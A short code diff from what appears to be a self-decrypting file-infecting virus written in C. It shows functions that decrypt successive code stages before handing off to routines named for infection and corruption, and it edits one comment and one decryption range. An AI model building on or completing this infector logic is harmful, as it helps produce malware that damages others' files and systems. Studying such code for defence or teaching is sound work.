@@ -1,7 +1,7 @@
 #include <war.h>
 
 ////////////////////////////////////////////////////////////////////////////////
-/// STATIC FUNCTIONS
+/// STATIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
 __attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
@@ -19,7 +19,6 @@ void host_constructor(struct s_host *host, struct s_keychain *keychain, char *fi
 #if LOGGER 
 	ENTRY_LOGGER("host_constructor:\t");
 #endif
-
 	decrypt_right(keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
 
 	if (context == FAILURE)
@@ -51,7 +50,7 @@ label:
 	_close(fd);
 
 	update_keychain_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
-	decrypt_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
+	decrypt_right(keychain, (char *)criteria, (void *)corruption - (void *)criteria);
 
 	criteria(host, keychain, context);
 }
